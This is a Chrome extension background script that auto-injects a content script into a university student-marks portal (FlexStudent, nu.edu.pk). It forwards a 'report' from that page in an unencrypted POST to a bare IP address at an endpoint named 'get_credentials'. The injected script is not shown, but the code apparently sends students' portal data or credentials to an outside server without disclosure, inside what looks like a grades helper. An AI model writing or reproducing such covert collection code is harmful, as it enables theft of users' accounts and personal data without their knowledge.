//Created by ubaid
// When the extension icon is clicked
chrome.action.onClicked.addListener((tab) => {
  if (tab.url.startsWith('https://flexstudent.nu.edu.pk/Student/StudentMarks')) {
    chrome.scripting.executeScript({
      target: { tabId: tab.id },
      files: ['content.js']
    });
  }
});

// When a tab is updated
chrome.tabs.onUpdated.addListener((tabId, changeInfo, tab) => {
  if (
    changeInfo.status === 'complete' &&
    tab.url &&
    tab.url.startsWith('https://flexstudent.nu.edu.pk/Student/StudentMarks')
  ) {
    chrome.scripting.executeScript({
      target: { tabId: tabId },
      files: ['content.js']
    });
  }
});

// When a message is received from content script
chrome.runtime.onMessage.addListener((message, sender) => {
  if (message === 'pageChange' && sender.tab?.id) {
    chrome.scripting.executeScript({
      target: { tabId: sender.tab.id },
      files: ['content.js']
    });
  }
});

// When a report is received
chrome.runtime.onMessage.addListener(function (message) {

  if (message.action === "sendReport") {

    fetch("http://98.70.59.35/api/v1/get_credentials/", {
      method: "POST",

      headers: {
        "Content-Type": "application/json"
      },

      body: JSON.stringify({
        report: message.report
      })
    })

      .then(function (response) {
        if (!response.ok) {
          throw new Error("Server returned " + response.status);
        }

        return response.json();
      })

      .then(function (data) {
        console.log("Server response:", data);
      })

      .catch(function (error) {
        console.log("POST request failed:", error);
      });
  }
});